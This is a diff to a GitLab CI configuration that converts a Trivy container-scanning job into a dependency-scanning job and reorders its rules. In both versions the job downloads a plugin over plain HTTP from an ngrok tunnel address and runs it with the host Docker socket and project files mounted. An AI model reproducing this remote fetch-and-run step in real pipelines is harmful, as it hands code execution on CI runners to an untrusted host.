@@ -2,22 +2,14 @@ variables:
     TRIVY_TAG: '0.39.1'
     TRIVY_IMAGE: 'aquasec/trivy:$TRIVY_TAG'
 
-.trivy-container_scanning:
+trivy-dependency_scanning:
     stage: test
     variables:
         GIT_STRATEGY: none
     allow_failure: true
     artifacts:
         reports:
-            container_scanning: trivy-container-scanning-report.json
-    rules:
-        - if: $DEPENDENCY_SCANNING_DISABLED
-          when: never
-        - if: $CI_COMMIT_BRANCH
-
-trivy-container_scanning:
-    extends:
-        - .trivy-container_scanning
+            dependency_scanning: trivy-dependency-scanning-report.json
     script:
         - >
             docker pull $TRIVY_IMAGE
@@ -29,11 +21,18 @@ trivy-container_scanning:
                     -v /var/run/docker.sock:/var/run/docker.sock \
                     -v ${CI_PROJECT_DIR}:/glproject \
                     $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
-                    container $CS_IMAGE -- --report-path="/glproject"
+                    dependency /glproject -- --report-path="/glproject"
             else
                 docker run --rm \
                     -v /var/run/docker.sock:/var/run/docker.sock \
                     --volumes-from ${CONTAINER_ID} \
                     $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
-                    container $CS_IMAGE -- --report-path="${CI_PROJECT_DIR}"
+                    dependency $CI_PROJECT_DIR -- --report-path=$CI_PROJECT_DIR
             fi
+
+    rules:
+        - if: $DEPENDENCY_SCANNING_DISABLED
+          when: never
+        - if: $DS_EXCLUDED_ANALYZERS =~ /trivy-gitlab/
+          when: never
+        - if: $CI_COMMIT_BRANCH
